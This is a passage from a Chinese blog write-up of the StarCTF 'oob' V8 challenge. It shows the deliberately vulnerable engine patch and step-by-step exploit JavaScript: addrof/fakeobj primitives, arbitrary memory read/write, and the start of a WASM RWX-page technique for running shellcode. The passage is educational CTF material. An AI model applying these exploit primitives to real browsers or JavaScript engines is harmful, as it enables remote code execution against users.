class_">DebugPrint</span>(arr);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>属性只多了一个<code>length</code>，用来记录目前这个数组的长度，其他和普通对象差不多吗，没什么好说的了，感兴趣大家可以自己测一下</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250817233203774.png" alt="image-20250817233203774"></p><h2 id="魔改v8"><a href="#魔改v8" class="headerlink" title="魔改v8"></a>魔改v8</h2><p>魔改v8是学习v8很重要的一个步骤，可以方便出题，理解v8的运行原理，我目前对于很多细节不太懂，就不做过多解释了，只会根据大佬的博客照猫画虎的写内置函数，建议大家看看别的大佬的博客，学习一下</p><h2 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h2><h3 id="StarCTF-oob"><a href="#StarCTF-oob" class="headerlink" title="StarCTF oob"></a>StarCTF oob</h3><h4 id="附件分析"><a href="#附件分析" class="headerlink" title="附件分析"></a>附件分析</h4><p>看题目给的补丁文件：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc  </span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644  </span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc  </span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc  </span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,  </span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);  </span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,  </span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);  </span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,  </span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);  </span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,  </span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);  </span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,  </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc  </span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644  </span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc  </span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc  </span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,  </span><br><span class="line">   return *final_length;  </span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;  // namespace  </span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;  </span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();  </span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();  </span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;  </span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(  </span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));  </span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);  </span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());  </span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());  </span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;  </span></span><br><span class="line"><span class="addition">+        //read  </span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));  </span></span><br><span class="line"><span class="addition">+    &#125;else&#123;  </span></span><br><span class="line"><span class="addition">+        //write  </span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;  </span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(  </span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));  </span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());  </span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();  </span></span><br><span class="line"><span class="addition">+    &#125;  </span></span><br><span class="line"><span class="addition">+&#125;  </span></span><br><span class="line">   </span><br><span class="line"> BUILTIN(ArrayPush) &#123;  </span><br><span class="line">   HandleScope scope(isolate);  </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h  </span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644  </span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h  </span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h  </span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;  </span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \  </span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \  </span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \  </span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \  </span></span><br><span class="line">                                                                                \  </span><br><span class="line">   /* ArrayBuffer */                                                            \  </span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \  </span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc  </span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644  </span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc  </span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc  </span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;  </span><br><span class="line">       return Type::Receiver();  </span><br><span class="line">     case Builtins::kArrayUnshift:  </span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;  </span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:  </span></span><br><span class="line"><span class="addition">+      return Type::Receiver();  </span></span><br><span class="line">   </span><br><span class="line">     // ArrayBuffer functions.  </span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>主要实现就是给数组对象增加了一个名为<code>oob</code>的方法，其主要实现在22~44行，其他修改只是为了能正常调用<code>oob</code>方法</p><p><code>oob</code>有越界漏洞，比如一个数组的大小为<code>length</code>,正常索引值应该为<code>[0~length-1]</code>，但是oob却可以访问索引值<code>[length]</code>,这就导致了漏洞，如果创建了一个数组对象<code>arr</code>，调用<code>arr.oob()</code>，可以实现越界读取，调用<code>arr.oob(data)</code>,可以将<code>data</code>越界写入<code>arr</code>的<code>elements</code></p><p>对于diff补丁的具体分析不再叙述，因为对于其中的很多宏定义以及函数的作用，写法，都不是很清晰，就不误导大家了，具体分析大家可参考<a href="https://rivers.chaitin.cn/blog/cqho67h0lnedo7thppl0">通过StarCTF oob题目学习V8 PWN 入门 | 长亭百川云</a></p><h4 id="准备函数"><a href="#准备函数" class="headerlink" title="准备函数"></a>准备函数</h4><p>首先要准备浮点数和大整数相互转换的函数，为什么要是浮点型呢，因为附件里使用oob方法时强制把数组中的<code>elements</code>中的内容转换为了<code>FixedDoubleArray</code>类型，也就意味着我们越界读会读取到<code>float</code>类型的数据，越界写进去的数据会当作<code>float</code>类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf=<span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float=<span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> buint=<span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftob</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> buint[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">btof</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    buint[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> float[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);  </span><br><span class="line">&#125; <span class="comment">//只是方便打印</span></span><br></pre></td></tr></table></figure><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>浮点类型的数组和普通的数组是没有什么区别的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_arr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_arr);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>可以看到，elements紧挨着这个数组，我们可以越界读取的地方记录着这个数组的map</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20233211.png" alt="屏幕截图 2025-08-18 233211"></p><p>当然其他数组也是如此</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> float_arr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">float_map=float_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_arr=[float_arr];</span><br><span class="line">obj_map=obj.<span class="title function_">oob</span>();</span><br></pre></td></tr></table></figure><p>如此，便可以得到浮点型数组的map地址和对象型数组的map地址的浮点型表示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">float_arr.<span class="title function_">oob</span>(<span class="title function_">btof</span>(<span class="number">123n</span>));</span><br></pre></td></tr></table></figure><p>当然越界写也很简单，将要写入的整数转化为浮点类型后，通过<code>oob</code>就可以写进去了，那么接下来就是漏洞利用了</p><p>有了上述两种类型的<code>map</code>地址后，我们可以实现</p><ul><li>获取任意对象的地址</li><li>将任意地址解析为对象类型</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_obj_addr</span>(<span class="params">obj</span>)</span><br><span class="line">&#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>]=obj;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(float_map);</span><br><span class="line">    <span class="keyword">let</span> addr=<span class="title function_">ftob</span>(obj_arr[<span class="number">0</span>])-<span class="number">1n</span>;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(obj_map);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addr_to_obj</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float_arr[<span class="number">0</span>]=<span class="title function_">btof</span>(addr+<span class="number">1n</span>);</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(obj_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj=float_arr[<span class="number">0</span>];</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(float_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了上述功能后，我们便可以伪造一个对象了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_fake_obj=[float_map,<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0x1000000000n</span>),<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>];</span><br></pre></td></tr></table></figure><p>这是创建了一个数组对象，这个数组对象的<code>elements</code>里的内容是我们伪造对象的数据，我们伪造的是一个<code>float</code>类型的对象，所以填入了<code>float_map</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make_fake_obj=[float_map,<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0x1000000000n</span>),<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>];</span><br><span class="line">fake_obj_addr=<span class="title function_">get_obj_addr</span>(make_fake_obj)-<span class="number">0x40n</span>;</span><br><span class="line">fake_obj=<span class="title function_">addr_to_obj</span>(fake_obj_addr);</span><br></pre></td></tr></table></figure><p>之前我们知道了，一个数组的elements紧挨着该数组的map，我们get到的对象地址就是储存map的位置，而这个数组8有个元素，故fake_map的地方就在-0x40处，如此便得到了伪造对象的地址，接着将这个地址解析为一个对象、</p><p>接着就可以操作伪造的对象，来实现任意地址读写的操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf=<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float=<span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> buint=<span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftob</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> buint[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">btof</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    buint[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> float[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_arr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">float_map=float_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_arr=[float_arr];</span><br><span class="line">obj_map=obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_obj_addr</span>(<span class="params">obj</span>)</span><br><span class="line">&#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>]=obj;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(float_map);</span><br><span class="line">    <span class="keyword">let</span> addr=<span class="title function_">ftob</span>(obj_arr[<span class="number">0</span>])-<span class="number">1n</span>;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(obj_map);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addr_to_obj</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float_arr[<span class="number">0</span>]=<span class="title function_">btof</span>(addr+<span class="number">1n</span>);</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(obj_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj=float_arr[<span class="number">0</span>];</span><br><span class="line">    float_arr.<span class="title function_">oob</span>(float_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">make_fake_obj=[float_map,<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0n</span>),<span class="title function_">btof</span>(<span class="number">0x1000000000n</span>),<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>];</span><br><span class="line">fake_obj_addr=<span class="title function_">get_obj_addr</span>(make_fake_obj)-<span class="number">0x40n</span>;</span><br><span class="line">fake_obj=<span class="title function_">addr_to_obj</span>(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readr</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    make_fake_obj[<span class="number">2</span>]=<span class="title function_">btof</span>(addr-<span class="number">0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data=fake_obj[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftob</span>(leak_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">writer</span>(<span class="params">addr,data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    make_fake_obj[<span class="number">2</span>]=addr-<span class="number">0x10n</span>+<span class="number">1n</span>;</span><br><span class="line">    fake_obj[<span class="number">0</span>]=<span class="title function_">btof</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test=&#123;<span class="attr">a</span>:<span class="number">1</span>&#125;;</span><br><span class="line">test_addr=<span class="title function_">get_obj_addr</span>(test);</span><br><span class="line">test_data=<span class="title function_">readr</span>(test_addr+<span class="number">0x18n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test_data.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title function_">writer</span>(test_addr+<span class="number">0x18n</span>,<span class="number">0x50000000000n</span>)</span><br><span class="line">test_data=<span class="title function_">readr</span>(test_addr+<span class="number">0x18n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test_data.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/image-20250819144551659.png" alt="image-20250819144551659"></p><p>可以看到成功吧测试对象的properties读了出来，并且完成了修改</p><hr><p><strong>几个小细节：这里制造伪造对象的容器，也就是我实例代码的<code>make_fake_obj</code>最好选择纯净的浮点型数组，因为浮点型数组的值是直接储存在elements里的。而如果多种类型的数据混在一块，就会导致里面的数据会通过指针来索引，其次是伪造的对象，不知为啥必须在length属性后面添加几个浮点数，也就是我上述代码的<code>,2.2,3.3,4.4,5.5</code>,无论是几个都行，但就是不能没有，这里我也不太清晰，只能照做了</strong></p><h4 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h4><p>我们现在已经拥有了任意地址读写的功能，接下来的目标就是利用<code>WASM</code>向程序中写入一段shellcode，然后执行这段shellcode</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);  </span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);  </span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;  </span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);  </span><br></pre></td></tr></table></figure><p>这里是直接照搬着别人的脚本，现在执行<code>f()</code>函数就相当于执行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开是比较好奇，既然可以直接写入函数，为什么不直接执行<code>system(&quot;/bin/sh&quot;)</code>，然后搜了一下</p><p>Wasm 的指令集是<strong>结构化、类型安全</strong>的，仅包含有限的内存操作、算术运算等指令，不支持直接调用操作系统系统调用（如<code>execve</code>、<code>open</code>等），也无法直接访问进程的其他内存区域。</p><p>但是wasm却可以给我们一段可读可写可执行的页内存，接下来便是向其中写入shellcode，<code>f</code>是一个函数对象，我们可以获取其地址，那么怎么获取可读可写可执行的页内存地址呢？调试一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf=<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float=<span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> buint=<span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftob</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> buint[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">btof</span>(<span class="params">data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    buint[<span class="number">0</span>]=data;</span><br><span class="line">    <span class="keyword">return</span> float[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);  </span><br><span class="line">&#125; </span><br><span 